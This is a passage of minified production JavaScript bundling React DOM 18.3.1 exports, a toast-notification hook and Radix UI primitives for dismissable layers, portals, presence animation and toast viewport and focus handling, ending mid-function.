lt.findDOMNode = function (e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0)
        throw typeof e.render == "function" ? Error(j(188)) : ((e = Object.keys(e).join(",")), Error(j(268, e)));
    return (e = em(t)), (e = e === null ? null : e.stateNode), e;
};
lt.flushSync = function (e) {
    return Nr(e);
};
lt.hydrate = function (e, t, n) {
    if (!ja(t)) throw Error(j(200));
    return Ra(null, e, t, !0, n);
};
lt.hydrateRoot = function (e, t, n) {
    if (!_u(e)) throw Error(j(405));
    var r = (n != null && n.hydratedSources) || null,
        o = !1,
        i = "",
        s = Mh;
    if (
        (n != null &&
            (n.unstable_strictMode === !0 && (o = !0),
            n.identifierPrefix !== void 0 && (i = n.identifierPrefix),
            n.onRecoverableError !== void 0 && (s = n.onRecoverableError)),
        (t = Rh(t, null, e, 1, n ?? null, o, !1, i, s)),
        (e[hn] = t.current),
        hi(e),
        r)
    )
        for (e = 0; e < r.length; e++)
            (n = r[e]),
                (o = n._getVersion),
                (o = o(n._source)),
                t.mutableSourceEagerHydrationData == null
                    ? (t.mutableSourceEagerHydrationData = [n, o])
                    : t.mutableSourceEagerHydrationData.push(n, o);
    return new Aa(t);
};
lt.render = function (e, t, n) {
    if (!ja(t)) throw Error(j(200));
    return Ra(null, e, t, !1, n);
};
lt.unmountComponentAtNode = function (e) {
    if (!ja(e)) throw Error(j(40));
    return e._reactRootContainer
        ? (Nr(function () {
              Ra(null, null, e, !1, function () {
                  (e._reactRootContainer = null), (e[hn] = null);
              });
          }),
          !0)
        : !1;
};
lt.unstable_batchedUpdates = ju;
lt.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
    if (!ja(n)) throw Error(j(200));
    if (e == null || e._reactInternals === void 0) throw Error(j(38));
    return Ra(e, t, n, !1, r);
};
lt.version = "18.3.1-next-f1338f8080-20240426";
function Ih() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Ih);
        } catch (e) {
            console.error(e);
        }
}
Ih(), (If.exports = lt);
var _i = If.exports;
const Lh = wf(_i);
var Dh,
    xp = _i;
(Dh = xp.createRoot), xp.hydrateRoot;
const sv = 1,
    av = 1e6;
let xl = 0;
function lv() {
    return (xl = (xl + 1) % Number.MAX_SAFE_INTEGER), xl.toString();
}
const wl = new Map(),
    wp = (e) => {
        if (wl.has(e)) return;
        const t = setTimeout(() => {
            wl.delete(e), ii({ type: "REMOVE_TOAST", toastId: e });
        }, av);
        wl.set(e, t);
    },
    cv = (e, t) => {
        switch (t.type) {
            case "ADD_TOAST":
                return { ...e, toasts: [t.toast, ...e.toasts].slice(0, sv) };
            case "UPDATE_TOAST":
                return { ...e, toasts: e.toasts.map((n) => (n.id === t.toast.id ? { ...n, ...t.toast } : n)) };
            case "DISMISS_TOAST": {
                const { toastId: n } = t;
                return (
                    n
                        ? wp(n)
                        : e.toasts.forEach((r) => {
                              wp(r.id);
                          }),
                    { ...e, toasts: e.toasts.map((r) => (r.id === n || n === void 0 ? { ...r, open: !1 } : r)) }
                );
            }
            case "REMOVE_TOAST":
                return t.toastId === void 0
                    ? { ...e, toasts: [] }
                    : { ...e, toasts: e.toasts.filter((n) => n.id !== t.toastId) };
        }
    },
    js = [];
let Rs = { toasts: [] };
function ii(e) {
    (Rs = cv(Rs, e)),
        js.forEach((t) => {
            t(Rs);
        });
}
function uv({ ...e }) {
    const t = lv(),
        n = (o) => ii({ type: "UPDATE_TOAST", toast: { ...o, id: t } }),
        r = () => ii({ type: "DISMISS_TOAST", toastId: t });
    return (
        ii({
            type: "ADD_TOAST",
            toast: {
                ...e,
                id: t,
                open: !0,
                onOpenChange: (o) => {
                    o || r();
                },
            },
        }),
        { id: t, dismiss: r, update: n }
    );
}
function dv() {
    const [e, t] = x.useState(Rs);
    return (
        x.useEffect(
            () => (
                js.push(t),
                () => {
                    const n = js.indexOf(t);
                    n > -1 && js.splice(n, 1);
                }
            ),
            [e]
        ),
        { ...e, toast: uv, dismiss: (n) => ii({ type: "DISMISS_TOAST", toastId: n }) }
    );
}
function Pe(e, t, { checkForDefaultPrevented: n = !0 } = {}) {
    return function (o) {
        if ((e == null || e(o), n === !1 || !o.defaultPrevented)) return t == null ? void 0 : t(o);
    };
}
function Sp(e, t) {
    if (typeof e == "function") return e(t);
    e != null && (e.current = t);
}
function Oh(...e) {
    return (t) => {
        let n = !1;
        const r = e.map((o) => {
            const i = Sp(o, t);
            return !n && typeof i == "function" && (n = !0), i;
        });
        if (n)
            return () => {
                for (let o = 0; o < r.length; o++) {
                    const i = r[o];
                    typeof i == "function" ? i() : Sp(e[o], null);
                }
            };
    };
}
function It(...e) {
    return x.useCallback(Oh(...e), e);
}
function Ma(e, t = []) {
    let n = [];
    function r(i, s) {
        const a = x.createContext(s),
            c = n.length;
        n = [...n, s];
        const u = (p) => {
            var g;
            const { scope: m, children: f, ...S } = p,
                y = ((g = m == null ? void 0 : m[e]) == null ? void 0 : g[c]) || a,
                w = x.useMemo(() => S, Object.values(S));
            return l.jsx(y.Provider, { value: w, children: f });
        };
        u.displayName = i + "Provider";
        function d(p, m) {
            var y;
            const f = ((y = m == null ? void 0 : m[e]) == null ? void 0 : y[c]) || a,
                S = x.useContext(f);
            if (S) return S;
            if (s !== void 0) return s;
            throw new Error(`\`${p}\` must be used within \`${i}\``);
        }
        return [u, d];
    }
    const o = () => {
        const i = n.map((s) => x.createContext(s));
        return function (a) {
            const c = (a == null ? void 0 : a[e]) || i;
            return x.useMemo(() => ({ [`__scope${e}`]: { ...a, [e]: c } }), [a, c]);
        };
    };
    return (o.scopeName = e), [r, pv(o, ...t)];
}
function pv(...e) {
    const t = e[0];
    if (e.length === 1) return t;
    const n = () => {
        const r = e.map((o) => ({ useScope: o(), scopeName: o.scopeName }));
        return function (i) {
            const s = r.reduce((a, { useScope: c, scopeName: u }) => {
                const p = c(i)[`__scope${u}`];
                return { ...a, ...p };
            }, {});
            return x.useMemo(() => ({ [`__scope${t.scopeName}`]: s }), [s]);
        };
    };
    return (n.scopeName = t.scopeName), n;
}
function kc(e) {
    const t = fv(e),
        n = x.forwardRef((r, o) => {
            const { children: i, ...s } = r,
                a = x.Children.toArray(i),
                c = a.find(hv);
            if (c) {
                const u = c.props.children,
                    d = a.map((p) =>
                        p === c
                            ? x.Children.count(u) > 1
                                ? x.Children.only(null)
                                : x.isValidElement(u)
                                  ? u.props.children
                                  : null
                            : p
                    );
                return l.jsx(t, { ...s, ref: o, children: x.isValidElement(u) ? x.cloneElement(u, void 0, d) : null });
            }
            return l.jsx(t, { ...s, ref: o, children: i });
        });
    return (n.displayName = `${e}.Slot`), n;
}
function fv(e) {
    const t = x.forwardRef((n, r) => {
        const { children: o, ...i } = n;
        if (x.isValidElement(o)) {
            const s = yv(o),
                a = gv(i, o.props);
            return o.type !== x.Fragment && (a.ref = r ? Oh(r, s) : s), x.cloneElement(o, a);
        }
        return x.Children.count(o) > 1 ? x.Children.only(null) : null;
    });
    return (t.displayName = `${e}.SlotClone`), t;
}
var _h = Symbol("radix.slottable");
function mv(e) {
    const t = ({ children: n }) => l.jsx(l.Fragment, { children: n });
    return (t.displayName = `${e}.Slottable`), (t.__radixId = _h), t;
}
function hv(e) {
    return x.isValidElement(e) && typeof e.type == "function" && "__radixId" in e.type && e.type.__radixId === _h;
}
function gv(e, t) {
    const n = { ...t };
    for (const r in t) {
        const o = e[r],
            i = t[r];
        /^on[A-Z]/.test(r)
            ? o && i
                ? (n[r] = (...a) => {
                      const c = i(...a);
                      return o(...a), c;
                  })
                : o && (n[r] = o)
            : r === "style"
              ? (n[r] = { ...o, ...i })
              : r === "className" && (n[r] = [o, i].filter(Boolean).join(" "));
    }
    return { ...e, ...n };
}
function yv(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n
        ? e.ref
        : ((t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get),
          (n = t && "isReactWarning" in t && t.isReactWarning),
          n ? e.props.ref : e.props.ref || e.ref);
}
function vv(e) {
    const t = e + "CollectionProvider",
        [n, r] = Ma(t),
        [o, i] = n(t, { collectionRef: { current: null }, itemMap: new Map() }),
        s = (y) => {
            const { scope: w, children: g } = y,
                h = R.useRef(null),
                v = R.useRef(new Map()).current;
            return l.jsx(o, { scope: w, itemMap: v, collectionRef: h, children: g });
        };
    s.displayName = t;
    const a = e + "CollectionSlot",
        c = kc(a),
        u = R.forwardRef((y, w) => {
            const { scope: g, children: h } = y,
                v = i(a, g),
                b = It(w, v.collectionRef);
            return l.jsx(c, { ref: b, children: h });
        });
    u.displayName = a;
    const d = e + "CollectionItemSlot",
        p = "data-radix-collection-item",
        m = kc(d),
        f = R.forwardRef((y, w) => {
            const { scope: g, children: h, ...v } = y,
                b = R.useRef(null),
                k = It(w, b),
                C = i(d, g);
            return (
                R.useEffect(() => (C.itemMap.set(b, { ref: b, ...v }), () => void C.itemMap.delete(b))),
                l.jsx(m, { [p]: "", ref: k, children: h })
            );
        });
    f.displayName = d;
    function S(y) {
        const w = i(e + "CollectionConsumer", y);
        return R.useCallback(() => {
            const h = w.collectionRef.current;
            if (!h) return [];
            const v = Array.from(h.querySelectorAll(`[${p}]`));
            return Array.from(w.itemMap.values()).sort((C, P) => v.indexOf(C.ref.current) - v.indexOf(P.ref.current));
        }, [w.collectionRef, w.itemMap]);
    }
    return [{ Provider: s, Slot: u, ItemSlot: f }, S, r];
}
var xv = [
        "a",
        "button",
        "div",
        "form",
        "h2",
        "h3",
        "img",
        "input",
        "label",
        "li",
        "nav",
        "ol",
        "p",
        "select",
        "span",
        "svg",
        "ul",
    ],
    et = xv.reduce((e, t) => {
        const n = kc(`Primitive.${t}`),
            r = x.forwardRef((o, i) => {
                const { asChild: s, ...a } = o,
                    c = s ? n : t;
                return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), l.jsx(c, { ...a, ref: i });
            });
        return (r.displayName = `Primitive.${t}`), { ...e, [t]: r };
    }, {});
function Fh(e, t) {
    e && _i.flushSync(() => e.dispatchEvent(t));
}
function tr(e) {
    const t = x.useRef(e);
    return (
        x.useEffect(() => {
            t.current = e;
        }),
        x.useMemo(
            () =>
                (...n) => {
                    var r;
                    return (r = t.current) == null ? void 0 : r.call(t, ...n);
                },
            []
        )
    );
}
function wv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = tr(e);
    x.useEffect(() => {
        const r = (o) => {
            o.key === "Escape" && n(o);
        };
        return (
            t.addEventListener("keydown", r, { capture: !0 }),
            () => t.removeEventListener("keydown", r, { capture: !0 })
        );
    }, [n, t]);
}
var Sv = "DismissableLayer",
    Cc = "dismissableLayer.update",
    bv = "dismissableLayer.pointerDownOutside",
    kv = "dismissableLayer.focusOutside",
    bp,
    zh = x.createContext({ layers: new Set(), layersWithOutsidePointerEventsDisabled: new Set(), branches: new Set() }),
    Fu = x.forwardRef((e, t) => {
        const {
                disableOutsidePointerEvents: n = !1,
                onEscapeKeyDown: r,
                onPointerDownOutside: o,
                onFocusOutside: i,
                onInteractOutside: s,
                onDismiss: a,
                ...c
            } = e,
            u = x.useContext(zh),
            [d, p] = x.useState(null),
            m = (d == null ? void 0 : d.ownerDocument) ?? (globalThis == null ? void 0 : globalThis.document),
            [, f] = x.useState({}),
            S = It(t, (P) => p(P)),
            y = Array.from(u.layers),
            [w] = [...u.layersWithOutsidePointerEventsDisabled].slice(-1),
            g = y.indexOf(w),
            h = d ? y.indexOf(d) : -1,
            v = u.layersWithOutsidePointerEventsDisabled.size > 0,
            b = h >= g,
            k = Pv((P) => {
                const A = P.target,
                    L = [...u.branches].some((M) => M.contains(A));
                !b || L || (o == null || o(P), s == null || s(P), P.defaultPrevented || a == null || a());
            }, m),
            C = Ev((P) => {
                const A = P.target;
                [...u.branches].some((M) => M.contains(A)) ||
                    (i == null || i(P), s == null || s(P), P.defaultPrevented || a == null || a());
            }, m);
        return (
            wv((P) => {
                h === u.layers.size - 1 && (r == null || r(P), !P.defaultPrevented && a && (P.preventDefault(), a()));
            }, m),
            x.useEffect(() => {
                if (d)
                    return (
                        n &&
                            (u.layersWithOutsidePointerEventsDisabled.size === 0 &&
                                ((bp = m.body.style.pointerEvents), (m.body.style.pointerEvents = "none")),
                            u.layersWithOutsidePointerEventsDisabled.add(d)),
                        u.layers.add(d),
                        kp(),
                        () => {
                            n &&
                                u.layersWithOutsidePointerEventsDisabled.size === 1 &&
                                (m.body.style.pointerEvents = bp);
                        }
                    );
            }, [d, m, n, u]),
            x.useEffect(
                () => () => {
                    d && (u.layers.delete(d), u.layersWithOutsidePointerEventsDisabled.delete(d), kp());
                },
                [d, u]
            ),
            x.useEffect(() => {
                const P = () => f({});
                return document.addEventListener(Cc, P), () => document.removeEventListener(Cc, P);
            }, []),
            l.jsx(et.div, {
                ...c,
                ref: S,
                style: { pointerEvents: v ? (b ? "auto" : "none") : void 0, ...e.style },
                onFocusCapture: Pe(e.onFocusCapture, C.onFocusCapture),
                onBlurCapture: Pe(e.onBlurCapture, C.onBlurCapture),
                onPointerDownCapture: Pe(e.onPointerDownCapture, k.onPointerDownCapture),
            })
        );
    });
Fu.displayName = Sv;
var Cv = "DismissableLayerBranch",
    Bh = x.forwardRef((e, t) => {
        const n = x.useContext(zh),
            r = x.useRef(null),
            o = It(t, r);
        return (
            x.useEffect(() => {
                const i = r.current;
                if (i)
                    return (
                        n.branches.add(i),
                        () => {
                            n.branches.delete(i);
                        }
                    );
            }, [n.branches]),
            l.jsx(et.div, { ...e, ref: o })
        );
    });
Bh.displayName = Cv;
function Pv(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = tr(e),
        r = x.useRef(!1),
        o = x.useRef(() => {});
    return (
        x.useEffect(() => {
            const i = (a) => {
                    if (a.target && !r.current) {
                        let c = function () {
                            Uh(bv, n, u, { discrete: !0 });
                        };
                        const u = { originalEvent: a };
                        a.pointerType === "touch"
                            ? (t.removeEventListener("click", o.current),
                              (o.current = c),
                              t.addEventListener("click", o.current, { once: !0 }))
                            : c();
                    } else t.removeEventListener("click", o.current);
                    r.current = !1;
                },
                s = window.setTimeout(() => {
                    t.addEventListener("pointerdown", i);
                }, 0);
            return () => {
                window.clearTimeout(s),
                    t.removeEventListener("pointerdown", i),
                    t.removeEventListener("click", o.current);
            };
        }, [t, n]),
        { onPointerDownCapture: () => (r.current = !0) }
    );
}
function Ev(e, t = globalThis == null ? void 0 : globalThis.document) {
    const n = tr(e),
        r = x.useRef(!1);
    return (
        x.useEffect(() => {
            const o = (i) => {
                i.target && !r.current && Uh(kv, n, { originalEvent: i }, { discrete: !1 });
            };
            return t.addEventListener("focusin", o), () => t.removeEventListener("focusin", o);
        }, [t, n]),
        { onFocusCapture: () => (r.current = !0), onBlurCapture: () => (r.current = !1) }
    );
}
function kp() {
    const e = new CustomEvent(Cc);
    document.dispatchEvent(e);
}
function Uh(e, t, n, { discrete: r }) {
    const o = n.originalEvent.target,
        i = new CustomEvent(e, { bubbles: !1, cancelable: !0, detail: n });
    t && o.addEventListener(e, t, { once: !0 }), r ? Fh(o, i) : o.dispatchEvent(i);
}
var Nv = Fu,
    Tv = Bh,
    nr = globalThis != null && globalThis.document ? x.useLayoutEffect : () => {},
    Av = "Portal",
    Hh = x.forwardRef((e, t) => {
        var a;
        const { container: n, ...r } = e,
            [o, i] = x.useState(!1);
        nr(() => i(!0), []);
        const s = n || (o && ((a = globalThis == null ? void 0 : globalThis.document) == null ? void 0 : a.body));
        return s ? Lh.createPortal(l.jsx(et.div, { ...r, ref: t }), s) : null;
    });
Hh.displayName = Av;
function jv(e, t) {
    return x.useReducer((n, r) => t[n][r] ?? n, e);
}
var zu = (e) => {
    const { present: t, children: n } = e,
        r = Rv(t),
        o = typeof n == "function" ? n({ present: r.isPresent }) : x.Children.only(n),
        i = It(r.ref, Mv(o));
    return typeof n == "function" || r.isPresent ? x.cloneElement(o, { ref: i }) : null;
};
zu.displayName = "Presence";
function Rv(e) {
    const [t, n] = x.useState(),
        r = x.useRef(null),
        o = x.useRef(e),
        i = x.useRef("none"),
        s = e ? "mounted" : "unmounted",
        [a, c] = jv(s, {
            mounted: { UNMOUNT: "unmounted", ANIMATION_OUT: "unmountSuspended" },
            unmountSuspended: { MOUNT: "mounted", ANIMATION_END: "unmounted" },
            unmounted: { MOUNT: "mounted" },
        });
    return (
        x.useEffect(() => {
            const u = cs(r.current);
            i.current = a === "mounted" ? u : "none";
        }, [a]),
        nr(() => {
            const u = r.current,
                d = o.current;
            if (d !== e) {
                const m = i.current,
                    f = cs(u);
                e
                    ? c("MOUNT")
                    : f === "none" || (u == null ? void 0 : u.display) === "none"
                      ? c("UNMOUNT")
                      : c(d && m !== f ? "ANIMATION_OUT" : "UNMOUNT"),
                    (o.current = e);
            }
        }, [e, c]),
        nr(() => {
            if (t) {
                let u;
                const d = t.ownerDocument.defaultView ?? window,
                    p = (f) => {
                        const y = cs(r.current).includes(f.animationName);
                        if (f.target === t && y && (c("ANIMATION_END"), !o.current)) {
                            const w = t.style.animationFillMode;
                            (t.style.animationFillMode = "forwards"),
                                (u = d.setTimeout(() => {
                                    t.style.animationFillMode === "forwards" && (t.style.animationFillMode = w);
                                }));
                        }
                    },
                    m = (f) => {
                        f.target === t && (i.current = cs(r.current));
                    };
                return (
                    t.addEventListener("animationstart", m),
                    t.addEventListener("animationcancel", p),
                    t.addEventListener("animationend", p),
                    () => {
                        d.clearTimeout(u),
                            t.removeEventListener("animationstart", m),
                            t.removeEventListener("animationcancel", p),
                            t.removeEventListener("animationend", p);
                    }
                );
            } else c("ANIMATION_END");
        }, [t, c]),
        {
            isPresent: ["mounted", "unmountSuspended"].includes(a),
            ref: x.useCallback((u) => {
                (r.current = u ? getComputedStyle(u) : null), n(u);
            }, []),
        }
    );
}
function cs(e) {
    return (e == null ? void 0 : e.animationName) || "none";
}
function Mv(e) {
    var r, o;
    let t = (r = Object.getOwnPropertyDescriptor(e.props, "ref")) == null ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n
        ? e.ref
        : ((t = (o = Object.getOwnPropertyDescriptor(e, "ref")) == null ? void 0 : o.get),
          (n = t && "isReactWarning" in t && t.isReactWarning),
          n ? e.props.ref : e.props.ref || e.ref);
}
var Iv = Rf[" useInsertionEffect ".trim().toString()] || nr;
function Lv({ prop: e, defaultProp: t, onChange: n = () => {}, caller: r }) {
    const [o, i, s] = Dv({ defaultProp: t, onChange: n }),
        a = e !== void 0,
        c = a ? e : o;
    {
        const d = x.useRef(e !== void 0);
        x.useEffect(() => {
            const p = d.current;
            p !== a &&
                console.warn(
                    `${r} is changing from ${p ? "controlled" : "uncontrolled"} to ${a ? "controlled" : "uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`
                ),
                (d.current = a);
        }, [a, r]);
    }
    const u = x.useCallback(
        (d) => {
            var p;
            if (a) {
                const m = Ov(d) ? d(e) : d;
                m !== e && ((p = s.current) == null || p.call(s, m));
            } else i(d);
        },
        [a, e, i, s]
    );
    return [c, u];
}
function Dv({ defaultProp: e, onChange: t }) {
    const [n, r] = x.useState(e),
        o = x.useRef(n),
        i = x.useRef(t);
    return (
        Iv(() => {
            i.current = t;
        }, [t]),
        x.useEffect(() => {
            var s;
            o.current !== n && ((s = i.current) == null || s.call(i, n), (o.current = n));
        }, [n, o]),
        [n, r, i]
    );
}
function Ov(e) {
    return typeof e == "function";
}
var _v = Object.freeze({
        position: "absolute",
        border: 0,
        width: 1,
        height: 1,
        padding: 0,
        margin: -1,
        overflow: "hidden",
        clip: "rect(0, 0, 0, 0)",
        whiteSpace: "nowrap",
        wordWrap: "normal",
    }),
    Fv = "VisuallyHidden",
    Ia = x.forwardRef((e, t) => l.jsx(et.span, { ...e, ref: t, style: { ..._v, ...e.style } }));
Ia.displayName = Fv;
var zv = Ia,
    Bu = "ToastProvider",
    [Uu, Bv, Uv] = vv("Toast"),
    [$h, Nk] = Ma("Toast", [Uv]),
    [Hv, La] = $h(Bu),
    Vh = (e) => {
        const {
                __scopeToast: t,
                label: n = "Notification",
                duration: r = 5e3,
                swipeDirection: o = "right",
                swipeThreshold: i = 50,
                children: s,
            } = e,
            [a, c] = x.useState(null),
            [u, d] = x.useState(0),
            p = x.useRef(!1),
            m = x.useRef(!1);
        return (
            n.trim() || console.error(`Invalid prop \`label\` supplied to \`${Bu}\`. Expected non-empty \`string\`.`),
            l.jsx(Uu.Provider, {
                scope: t,
                children: l.jsx(Hv, {
                    scope: t,
                    label: n,
                    duration: r,
                    swipeDirection: o,
                    swipeThreshold: i,
                    toastCount: u,
                    viewport: a,
                    onViewportChange: c,
                    onToastAdd: x.useCallback(() => d((f) => f + 1), []),
                    onToastRemove: x.useCallback(() => d((f) => f - 1), []),
                    isFocusedToastEscapeKeyDownRef: p,
                    isClosePausedRef: m,
                    children: s,
                }),
            })
        );
    };
Vh.displayName = Bu;
var Wh = "ToastViewport",
    $v = ["F8"],
    Pc = "toast.viewportPause",
    Ec = "toast.viewportResume",
    Kh = x.forwardRef((e, t) => {
        const { __scopeToast: n, hotkey: r = $v, label: o = "Notifications ({hotkey})", ...i } = e,
            s = La(Wh, n),
            a = Bv(n),
            c = x.useRef(null),
            u = x.useRef(null),
            d = x.useRef(null),
            p = x.useRef(null),
            m = It(t, p, s.onViewportChange),
            f = r.join("+").replace(/Key/g, "").replace(/Digit/g, ""),
            S = s.toastCount > 0;
        x.useEffect(() => {
            const w = (g) => {
                var v;
                r.length !== 0 && r.every((b) => g[b] || g.code === b) && ((v = p.current) == null || v.focus());
            };
            return document.addEventListener("keydown", w), () => document.removeEventListener("keydown", w);
        }, [r]),
            x.useEffect(() => {
                const w = c.current,
                    g = p.current;
                if (S && w && g) {
                    const h = () => {
                            if (!s.isClosePausedRef.current) {
                                const C = new CustomEvent(Pc);
                                g.dispatchEvent(C), (s.isClosePausedRef.current = !0);
                            }
                        },
                        v = () => {
                            if (s.isClosePausedRef.current) {
                                const C = new CustomEvent(Ec);
                                g.dispatchEvent(C), (s.isClosePausedRef.current = !1);
                            }
                        },
                        b = (C) => {
                            !w.contains(C.relatedTarget) && v();
                        },
                        k = () => {
                            w.contains(document.activeElement) || v();
                        };
                    return (
                        w.addEventListener("focusin", h),
                        w.addEventListener("focusout", b),
                        w.addEventListener("pointermove", h),
                        w.addEventListener("pointerleave", k),
                        window.addEventListener("blur", h),
                        window.addEventListener("focus", v),
                        () => {
                            w.removeEventListener("focusin", h),
                                w.removeEventListener("focusout", b),
                                w.removeEventListener("pointermove", h),
                                w.removeEventListener("pointerleave", k),
                                window.removeEventListener("blur", h),
                                window.removeEventListener("focus", v);
                        }
                    );
                }
            }, [S, s.isClosePausedRef]);
        const y = x.useCallback(
            ({ tabbingDirection: w }) => {
                const h = a().map((v) => {
                    const b = v.ref.current,
                        k = [b, ...nx(b)];
                    return w === "forwards" ? k : k.reverse();
                });
                return (w === "forwards" ? h.reverse() : h).flat();
            },
            [a]
        );
        return (
            x.useEffect(() => {
                const w = p.current;
                if (w) {
                    const g = (h) => {
                        var k, C, P;
                        const v = h.altKey || h.ctrlKey || h.metaKey;
                        if (h.key === "Tab" && !v) {
                            const A = document.activeElement,
                                L = h.shiftKey;
                            if (h.target === w && L) {
                                (k = u.current) == null || k.focus();
                                return;
                            }
                            const F = y({ tabbingDirection: L ? "backwards" : "forwards" }),
                                G = F.findIndex((O) => O === A);
                            Sl(F.slice(G + 1))
                                ? h.preventDefault()
                                : L
                                  ? (C = u.current) == null || C.focus()
                                  : (P = d.current) == null || P.focus();
                        }
                    };
                    return w.addEventListener("keydown", g), () => w.removeEventListener("keydown", g);
                }
            }, [a, y]),
            l.jsxs(Tv, {
                ref: c,
                role: "region",
                "aria-label": o.replace("{hotkey}", f),
                tabIndex: -1,
                style: { pointerEvents: S ? void 0 : "none" },
                children: [
                    S &&
                        l.jsx(Nc, {
                            ref: u,
                            onFocusFromOutsideViewport: () => {
                                const w = y({ tabbingDirection: "forwards" });
                                Sl(w);
                            },
                        }),
                    l.jsx(Uu.Slot, { scope: n, children: l.jsx(et.ol, { tabIndex: -1, ...i, ref: m }) }),
                    S &&
                        l.jsx(Nc, {
                            ref: d,
                            onFocusFromOutsideViewport: () => {
                                const w = y({ tabbingDirection: "backwards" });
                                Sl(w);
                            },
                        }),
                ],
            })
        );
    });
Kh.displayName = Wh;
var Gh = "ToastFocusProxy",
    Nc = x.forwardRef((e, t) => {
        const { __scopeToast: n, onFocusFromOutsideViewport: r, ...o } = e,
            i = La(Gh, n);
        return l.jsx(Ia, {
            "aria-hidden": !0,
            tabIndex: 0,
            ...o,
            ref: t,
            style: { position: "fixed" },
            onFocus: (s) => {
                var u;
                const a = s.relatedTarget;
                !((u = i.viewport) != null && u.contains(a)) && r();
            },
        });
    });
Nc.displayName = Gh;
var Fi = "Toast",
    Vv = "toast.swipeStart",
    Wv = "toast.swipeMove",
    Kv = "toast.swipeCancel",
    Gv = "toast.swipeEnd",
    Qh = x.forwardRef((e, t) => {
        const { forceMount: n, open: r, defaultOpen: o, onOpenChange: i, ...s } = e,
            [a, c] = Lv({ prop: r, defaultProp: o ?? !0, onChange: i, caller: Fi });
        return l.jsx(zu, {
            present: n || a,
            children: l.jsx(Xv, {
                open: a,
                ...s,
                ref: t,
                onClose: () => c(!1),
                onPause: tr(e.onPause),
                onResume: tr(e.onResume),
                onSwipeStart: Pe(e.onSwipeStart, (u) => {
                    u.currentTarget.setAttribute("data-swipe", "start");
                }),
                onSwipeMove: Pe(e.onSwipeMove, (u) => {
                    const { x: d, y: p } = u.detail.delta;
                    u.currentTarget.setAttribute("data-swipe", "move"),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-move-x", `${d}px`),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-move-y", `${p}px`);
                }),
                onSwipeCancel: Pe(e.onSwipeCancel, (u) => {
                    u.currentTarget.setAttribute("data-swipe", "cancel"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-end-y");
                }),
                onSwipeEnd: Pe(e.onSwipeEnd, (u) => {
                    const { x: d, y: p } = u.detail.delta;
                    u.currentTarget.setAttribute("data-swipe", "end"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),
                        u.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-end-x", `${d}px`),
                        u.currentTarget.style.setProperty("--radix-toast-swipe-end-y", `${p}px`),
                        c(!1);
                }),
            }),
        });
    });
Qh.displayName = Fi;
var [Qv, qv] = $h(Fi, { onClose() {} }),
    Xv = x.forwardRef((e, t) => {
        const {
                __scopeToast: n,
                type: r = "foreground",
                duration: o,
                open: i,
                onClose: s,
                onEscapeKeyDown: a,
                onPause: c,
                onResume: u,
                onSwipeStart: d,
                onSwipeMove: p,
                onSwipeCancel: m,
                onSwipeEnd: f,
                ...S
            } = e,
            y = La(Fi, n),
            [w, g] = x.useState(null),
            h = It(t, (O) => g(O)),
            v = x.useRef(null),
            b = x.useRef(null),
            k = o || y.duration,
            C = x.useRef(0),
            P = x.useRef(k),
            A = x.useRef(0),
            { onToastAdd: L, onToastRemove: M } = y,
            U = tr(() => {
                var X;
                (w == null ? void 0 : w.contains(document.activeElement)) && ((X = y.viewport) == null || X.focus()),
                    s();
            }),
            F = x.useCallback(
                (O) => {
                    !O ||
                        O === 1 / 0 ||
                        (window.clearTimeout(A.current),
                        (C.current = new Date().getTime()),
                        (A.current = window.setTimeout(U, O)));
                },
                [U]
            );
        x.useEffect(() => {
            const O = y.viewport;
            if (O) {
                const X = () => {
                        F(P.current), u == null || u();
                    },
                    H = () => {
                        const $ = new Date().getTime() - C.current;
                        (P.current = P.current - $), window.clearTimeout(A.current), c == null || c();
                    };
                return (
                    O.addEventListener(Pc, H),
                    O.addEventListener(Ec, X),
                    () => {
                        O.removeEventListener(Pc, H), O.removeEventListener(Ec, X);
                    }
                );
            }
        }, [y.viewport, k, c, u, F]),
            x.useEffect(() => {
                i && !y.isClosePausedRef.current && F(k);
            }, [i, k, y.isClosePausedRef, F]),
            x.useEffect(() => (L(), () => M()), [L, M]);
        const G = x.useMemo(() => (w ? tg(w) : null), [w]);
        return y.viewport
            ? l.jsxs(l.Fragment, {
                  children: [
                      G &&
                          l.jsx(Yv, {
                              __scopeToast: n,
                              role: "status",
                              "aria-live": r === "foreground" ? "assertive" : "polite",
                              "aria-atomic": !0,
                              children: G,
                          }),
                      l.jsx(Qv, {
                          scope: n,
                          onClose: U,
                          children: _i.createPortal(
                              l.jsx(Uu.ItemSlot, {
                                  scope: n,
                                  children: l.jsx(Nv, {
                                      asChild: !0,
                                      onEscapeKeyDown: Pe(a, () => {
                                          y.isFocusedToastEscapeKeyDownRef.current || U(),
                                              (y.isFocusedToastEscapeKeyDownRef.current = !1);
                                      }),
                                      children: l.jsx(et.li, {
                                          role: "status",
                                          "aria-live": "off",
                                          "aria-atomic": !0,
                                          tabIndex: 0,
                                          "data-state": i ? "open" : "closed",
                                          "data-swipe-direction": y.swipeDirection,
                                          ...S,
                                          ref: h,
                                          style: { userSelect: "none", touchAction: "none", ...e.style },
                                          onKeyDown: Pe(e.onKeyDown, (O) => {
